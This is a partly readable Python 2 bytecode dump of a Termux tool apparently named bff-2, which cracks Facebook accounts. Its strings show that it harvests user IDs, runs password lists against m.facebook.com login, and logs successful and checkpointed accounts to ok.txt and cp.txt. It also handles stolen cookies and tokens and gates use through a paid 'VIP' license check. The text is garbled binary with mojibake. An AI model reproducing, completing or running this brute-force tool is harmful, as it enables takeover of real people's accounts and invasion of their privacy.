[1;95mâ¢ [1;96mexample[1;91m :[1;96m 445566[1;91m,[1;96m556677[1;91m,[1;96m123456t   killalls   -9t   python2t   stderrt   stdinR,   R;   s/   [1;95mâ¢[1;96m id list file [1;91m: [1;93ms   [1;95mâ¢ [1;96m%si   t   pws   [1;95mâ¢ [0;96m%ssN   
[1;95mâ¢ [1;96maccount [1;92m[OK] [1;96msaved to [1;91m-> [1;92mok.txts\   [1;95mâ¢ [1;96maccount [1;91m[[1;93mCP[1;91m][1;96m saved to [1;91m-> [1;93mcp.txt
s3   [1;95mâ¢ [1;96min the process, please be patienti#   s   
[1;91mâ¢ [1;92mfinished.(   t   adaRÆ   t   koR#   R   R   R7   R   t   apkR   R*   R+   t   fsR.   R   R   R©   t   pwlistt
   subprocesst   Popent   PIPERå   R    t   mapt   maint   remove(   R   t   showR   R4   R2   t   s(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   ­  s~    							(	
3			B	3c         C   s©   t  d  j d  |  _ t |  j  d k r: |  j   nk x( |  j D] } | j i |  j d 6 qD Wd GHd GHd GHt d  j |  j	 |  j  t
 j |  j  d	 GHd  S(
   Ns0   [1;91mâ¢[1;96m password list [1;91m:[1;93m t   ,i    Rë   sN   
[1;95mâ¢ [1;96maccount [1;92m[OK] [1;96msaved to [1;91m-> [1;92mok.txts\   [1;95mâ¢[1;96m account [1;91m[[0;93mCP[1;91m][1;96m saved to[1;91m -> [1;93mcp.txt
s3   [1;95mâ¢ [1;96min the process, please be patienti   s   
[1;92mâ¢ [1;92mfinished(   R   R©   Rë   R)   Rð   R   RÉ   R    Rô   Rõ   R   Rö   Rî   (   R   R2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRð   ô  s    c      	   C   s>  y#x| j  d  D]} t | j  d  | d  } | j  d  d k rt d | j  d  | t f GH|  j j d | j  d  | f  | j  d  t d  j   k r° Pn; t d d	  j d
 | j  d  | t	 | j  d   f  d
 | j  d  | t	 | j  d   f } Pq | j  d  d k r t
 d | j  d  | t f GH|  j j d | j  d  | f  t d d	  j d | j  d  | f  Pq q q W|  j d 7_ t j d d d d d d d d g  } d | d |  j t |  j  t |  j  t |  j  f Gt j j   Wn |  j |  n Xd  S(   NRë   RK   s   https://m.facebook.comRÄ   RÃ   s?   [0;91m  [0;92m*---> [OK] [0;92m%s[0;92m â [0;92m%s  %s s	   %s â %ss   ok.txts   a+s   %s â %s â %s

R   RÆ   sT   [0;91m  [0;93m*--->[0;91m [[0;93mCP[0;91m] [0;93m%s[0;91m â [0;93m%s  %s s   cp.txts   %s â %s â 
i   s   [1;91ms   [1;92ms   [1;93ms   [1;94ms   [1;95ms   [1;96ms   [1;97ms   [0ms   s   â¢ [1;96m*---> [1;92mCrack[1;96m [%s/%s]-[1;92m[OK[0;91m:[0;92m%s[1;92m][1;96m-[1;91m[[0;93mCP[0;91m:[0;93m%s[1;91m](   R   RÓ   R   Rp   Rì   R   R   R*   R(   RÕ   Ro   RÆ   Rí   t   randomR   R)   R   R   R,   R-   Rõ   (   R   R   R2   t   logRí   t   m(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRõ     s.    #!;+#)':(   R5   R6   R#   R   Rð   Rõ   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRæ   «  s   G	c         C   s;  t  |  d  t j t j | d | d t   j d  } xð| j d d t D]Ù} d t	 t  |   j
   j    Gt j j   d t |  k rd	 t | d  k r± qP qt | d  } d
 | k rh| j d  j d  j d d  } t j j d |  } t	 |  d k r d j |  } | t  |   j
   k rBqet  |  d  j d | | f  q qt j j d |  } | j d  j d  j d d  } t	 |  d k rd j |  } | t  |   j
   k rÝq t  |  d  j d | | f  qn  d | j k rP t |  | | d  qP qP Wt d  d  S(   Ns   a+R   R   s   html.parserR   R   sH   [1;95mâ¢[1;96m [GET][1;93m ([1;92m%s[1;93m) press ctrl+z for stops	   <img alt=s   home.phps   profile.phpt   imgt   alts   , profile pictureR
   s   /profile\.php\?id=(.*?)&i    s   %s<=>%s
s   /(.*?)\?s   See Next Resultss   
[1;92mâ¢ finished.(   R   R   R   R   R   R    R!   R"   R#   R)   R*   R+   R   R,   R-   RC   R   R   R$   R%   RF   R(   Ra   R/   (   R   Ru   Rª   R2   t   gRG   R¼   t   pk(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRa      s6    - $&$&c         C   s=   t  j j d  r5 t  j j d  d k r. t St Sn t Sd  S(   Ns   .coki    (   R   t   patht   existst   getsizeR#   t   False(   t   arg(    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   cekC  s
    c          C   s¥  d  }  d  } d  } t d  t k r_ y" t d  } t |  }  t } Wq} d GHt   q} Xn t t d  j   j	    }  t
 j d d |  d t   j } t t j j d |   d	 k rzt   t |   t k rå t d
  n  d GHd t j | d  j d  j d	 d !GH| t k r?t d d  j |  t   GHn  t d  j d d  } t d  } t | |  d |  n' y t j d  Wn n Xd GHt   d  S(   Ni   s)   [1;95mâ¢[1;96m cookie[1;91m : [1;93ms   [1;91mâ¢ invalid cookies   .coks'   https://mbasic.facebook.com/profile.phpR   R   t   logouti    s9   [1;91mâ¢ failed when detecting language or login faileds   [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢
[1;91m   _______  ______ _______ _______ _     _
   |       |_____/ |_____| |       |____/ 
[1;97m   |_____  |    \_ |     | |_____  |    \_

[1;95m     â¢ [0;93mGithub -> github.com/GUPTA-SHAKEL [1;95mâ¢   
 [1;91mâ¢[1;93mâ¢[1;92mâ¢                                      [1;91mâ¢[1;93mâ¢[1;92mâ¢s/   
[1;95mâ¢ [1;96mlogin as[1;91m :[1;93m %s s   html.parserR   i
   R   s+   [1;95mâ¢[1;96m filename[1;91m : [1;93mR   R   s/   [1;95mâ¢[1;96m search query[1;91m : [1;93ms-   https://mbasic.facebook.com/search/people/?q=s   [1;91mâ¢ login fail!(   Rb   R  R  R   R×   R#   t   dumpflR   R*   t   stripR   R   R    R!   R)   R   R$   R%   R   R¢   R/   R   R   R(   R7   R   Ra   R   Rö   (   t   cvdsRg   t   newRu   R   Rø   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR  N  s@    
!!(t   lcc           B   s,   e  Z d    Z d   Z d   Z d   Z RS(   c         C   s2   d |  _  t j d  j j   |  _ |  j   d  S(   Ns)   /data/data/com.termux/files/usr/lib/.bashsF   https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt(   R  R   R   R!   R	  R^   t   genid(   R   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR   w  s    	c         C   s   yX t  j j |  j  rM t  j j |  j  d k r@ |  j   qW |  j   n
 |  j   Wn! t k
 r{ } t d |  n Xd  S(   Ni    s   [1;91mâ¢ an error accoured %s(   R   R  R  R  R  R  R.   R/   (   R   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   paths|  s    c      	   C   sõ   g  } t  d  } xH t d  D]: } | j t j t j |  t j |  j   g   q Wd d j |  GHt |  j d  j	 d j |   t
 d  t t j d d |  j j d	 d j |   g d
 t j d t j d t j j    d  S(   Nt$   abcdefghijklmnopqrstuvwxyz1234567890i   s*   [1;95mâ¢[1;96m your id[1;91m :[1;93m R
   R   s+   * press enter to register or submit order..t   amt   starts   index.php?action=reg&id=Ré   Rê   R,   (   R&   t   rangeR   Rú   R   t   upperRF   R   R  R(   R   R/   Rñ   Rò   R^   Rn   Ró   t   wait(   R   RK   t   absR2   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR    s    8"
c      	   C   sÜ  t  j |  j j d  d i t |  j  j   j   d 6} | j   j	 d  d k r| j   j	 d  d d k rhd	 | j   j	 d  d
 GHd t
 t |  j  j   j   t f GHt d  t t j d d d t  j	 d  j j   d t |  j  j   j   d | j   d d
 d | j   j	 d  d g d t j d t j d t j j    qØt   t   d | j   d d | j   d d
 f GHt j j d  rõt j j d  d k rÎqt d d  j | j   d d  n$ t d d  j | j   d d  | j   d d d k rid | j   d  GHd! t
 t f GHd" d# d$ d% GHqØd | j   d  GHd& t t f GHd" d# d$ d% GHn9 d' | j k r»|  j   n d( | j   d) GH|  j   d  S(*   Ns   index.php?action=cekRh   RK   RÄ   RÃ   R9   t	   confirmedt   falses   	[ hello %s ]
RG   s   %s* your id: (%s) unconfirmed%ss"   * press enter to get confirmation.R  R  s   https://wa.me/sA   https://raw.githubusercontent.com/GUPTA-SHAKEL/VIP/main/CRACK.txts   ?text=please confirm me

ID: s   
NAME: s   
ORDER:  %sdayst   license_limitRé   Rê   R,   s     + order: %s days, name- %ss   .browseri    R   t   browsert   vipt   trues     + days used: %st   stays     + VIP: %syes%ss     RÔ   i(   s   
s     + VIP: %sno%ss	   not founds   [1;91mâ¢ error, %st   message(   R   Rz   R^   Rn   R   R  R*   R	  Rk   R   R   Rp   R   R/   Rñ   Rò   R!   Ró   R  R   R7   R   R  R  R(   Ro   R  (   R   Ru   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR    s8    ='
	+'$(   R5   R6   R   R  R  R  (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR  u  s   			s   ok.txts   a+c           C   s8   t  j d  t  j d  t  j d  t  j d  d  S(   NR   s   pkg update && pkg upgrades   git pulls   python2 VIP.py(   R   R   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyRÉ   ½  s    c       	   C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t  j d  t   n Xy= t j d |   } t j	 | j
  } | d } | d } Wnz t k
 r÷ t  j d  d GHt  j d  t j d	  t   t j d	  t   n# t j j k
 rd
 GHt   n Xt   d | d GHd GHd GHd GHd GHd GHd GHd GHt d  } | d k r~t  j d  d GHn| d k rt   nw| d k rªt   na| d k rÆt t    nE| d k rÜt   n/| d k rùt   t   n| d k rt   nü | d k rdt d  t  j d  y t  j d   t d!  Wqt d"  qXn§ | d# k rºd$ GHd% GHt t j d& d' d( g d) t j d* t j d+ t j j    nQ | d, k rùd GHt   t  d-  t  j d  t  j! j   n d. GHt  j! j   d  S(/   NR   s	   login.txtRu   s   [1;91mâ¢ invalids   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=RG   RK   i   s   [1;91mâ¢ No connections)   
[1;95mâ¢[1;96m [1;96mWelcome [1;92ms   [1;96m s     s)   [1;95mâ¢[1;92m 1 [1;96mDump Id Publics-   [1;95mâ¢[1;92m 2 [1;96mDump Id Followers s&   [1;95mâ¢[1;92m 3 [1;96mStart Cracks%   [1;95mâ¢[1;92m 4 [1;96mCek Results'   [1;95mâ¢[1;92m 5 [1;92mUpdate Toolss/   [1;95mâ¢[1;91m 0 [1;91mRemove Token/Cookie
s0   [1;95mâ¢[1;92m [1;96mSelect[1;91m : [1;93mR
   s   [1;91mâ¢[1;93mâ¢[1;92mâ¢
[1;91m     _______  ______ _______ _______ _     _
     |       |_____/ |_____| |       |____/ 
[1;97m     |_____  |    \_ |     | |_____  |    \_

[1;95m       â¢ [0;93mGithub -> github.com/GUPTA-SHAKEL [1;95mâ¢   
 [1;91mâ¢[1;93mâ¢[1;92mâ¢ R:   R;   t   33RT   RR   RV   t   66s   [1;95mâ¢ [1;93mpress enter s%   xdg-open https://wa.me/+2347013107449s)   /data/data/com.termux/files/usr/lib/.bashs   [1;92mâ¢ run again the tools.s%   [1;95mâ¢[1;96m towards the browsert   77R   s+   [1;95mâ¢ [1;96mplease wait opening groupR  R  s/   https://www.facebook.com/groups/453688872336137Ré   Rê   R,   R<   s&   
[1;92mâ¢ Succes Remove Cookie/Tokens   [1;91mâ¢ Wrong Input("   R   R   R   R*   Rv   RO   R   R   Rk   Rl   R!   Rm   R=   R>   Rd   Re   R/   R7   R   R   R   R   R   RÉ   Ræ   R9   Rö   Rñ   Rò   Ró   R  R[   t   jalanR   (   Rw   Rq   R   Rr   RK   Ru   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR?   Ä  s    







@
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸®?(   R   R,   R(   R-   R=   R>   (   R   R4   (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyR!    s    RB   (    (    (    (    (    (P   R   R   R   R   Rñ   Rú   Rk   R=   R$   t   reloadt   setdefaultencodingt   multiprocessing.poolR    t   loggingR   R   R   t   WRp   Ro   t   BR   t   Ot   CRn   t   noticet   warningt   goodt   warnR¼   R^   R   R!   R	  R²   Rb   t   uasR  R  R  R   R*   R   R9   R8   R7   R   RI   RO   RN   RZ   RY   R[   R   Rf   R   R   R   R   R    Rµ   RÊ   RÓ   R    RÕ   R×   R³   Rä   Rª   Rå   Ræ   Ra   R  R  R  R   RÉ   R?   R!  R5   (    (    (    s(   /storage/emulated/0/Download/bff-2_ok.pyt   <module>   s¦   
		&												-	-A	7	#				B
	u	#		'C		M	